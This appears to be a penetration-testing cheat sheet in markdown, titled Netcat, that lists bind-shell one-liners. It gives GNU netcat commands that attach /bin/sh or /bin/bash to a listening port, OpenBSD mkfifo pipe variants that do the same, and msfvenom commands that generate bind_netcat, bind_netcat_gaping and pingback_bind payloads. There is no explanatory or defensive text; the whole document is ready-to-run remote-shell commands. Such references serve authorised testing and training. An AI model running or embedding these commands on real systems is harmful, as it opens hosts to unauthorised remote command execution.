# Netcat

## 01 - One-liners

### 1.1 - GNU

```
$ nc -lnvp <PORT> -e /bin/sh

$ nc -lnvp <PORT> -e /bin/bash
```

### 1.2 - OpenBSD

```
$ mkfifo /tmp/f; (nc -lp <PORT> ||nc -l <PORT>)0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

$ mkfifo /tmp/f; (nc -lp <PORT> ||nc -l <PORT>)0</tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f
```

## 02 - Generate via `msfvenom`

### 2.1 - OpenBSD Method

```
$ msfvenom -p cmd/unix/bind_netcat lport=<PORT>
```

### 2.2 - Traditional GNU Method

```
$ msfvenom -p cmd/unix/bind_netcat_gaping lport=<PORT>

$ msfvenom -p cmd/unix/bind_netcat_gaping_ipv6 lport=<PORT>

$ msfvenom -p cmd/unix/pingback_bind lport=<PORT>
```